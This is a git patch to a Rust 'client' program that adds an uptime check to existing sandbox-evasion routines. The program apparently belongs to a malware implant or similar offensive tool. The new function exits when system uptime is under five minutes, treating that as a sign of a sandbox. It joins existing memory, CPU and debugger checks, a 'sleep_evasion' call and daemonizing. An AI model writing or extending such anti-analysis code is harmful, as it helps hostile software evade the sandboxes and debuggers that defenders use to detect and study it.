@@ -1,0 +1,46 @@
+From 6d37baf0b2b1d0f2b4d5ed0f1fe5c410ffbd3dd3 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Wed, 14 Oct 2026 07:49:37 +0700
+Subject: [PATCH 04/14] checkUptime
+
+---
+ client/src/main.rs    |  1 +
+ client/src/sandbox.rs | 10 ++++++++++
+ 2 files changed, 11 insertions(+)
+
+diff --git a/client/src/main.rs b/client/src/main.rs
+index 0306fc6..2793b9c 100644
+--- a/client/src/main.rs
++++ b/client/src/main.rs
+@@ -37,6 +37,7 @@ fn daemonize_process() {
+ fn main() {
+     sandbox::check_memory_limit();
+     sandbox::check_cpu_limit();
++    sandbox::check_uptime_limit();
+     sandbox::sleep_evasion(Duration::from_secs(1));
+     #[cfg(windows)]
+     sandbox::check_debugger();
+diff --git a/client/src/sandbox.rs b/client/src/sandbox.rs
+index 520cd99..c48dcb7 100644
+--- a/client/src/sandbox.rs
++++ b/client/src/sandbox.rs
+@@ -38,6 +38,16 @@ pub fn check_cpu_limit() {
+     }
+ }
+ 
++pub fn check_uptime_limit() {
++    let uptime = System::uptime();
++
++    if uptime < 300 {
++        // Less than 300 seconds (5 minutes) — likely sandboxed
++        println!("Program is likely running in a sandboxed environment.");
++        exit(1);
++    }
++}
++
+ pub fn sleep_evasion(sleep_duration: Duration) {
+     let start_instant = Instant::now();
+     let start_system_time = SystemTime::now();
+-- 
+2.39.5 (Apple Git-154)
+
